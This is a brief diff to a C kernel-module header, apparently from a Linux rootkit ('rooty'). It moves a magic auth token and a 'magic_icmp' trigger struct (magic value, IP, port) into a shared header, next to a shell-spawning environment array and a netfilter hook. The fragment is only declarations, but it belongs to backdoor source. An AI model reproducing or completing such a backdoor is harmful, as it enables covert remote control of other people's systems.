@@ -1,7 +1,7 @@
 #ifndef SSH_H
 #define SSH_H
 
-#define AUTH_TOKEN 0xDEADC0DE
+#include "common/rooty_uapi.h"
 
 DECLARE_WAIT_QUEUE_HEAD(run_event);
 
@@ -19,12 +19,6 @@ static char *ssh_envp[] =
     "HOME=/",
     "TERM=xterm",
     "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
-};
-
-struct magic_icmp {
-    unsigned int magic;
-    unsigned int ip;
-    unsigned short port;
 };
 
 struct nf_hook_ops pre_hook;
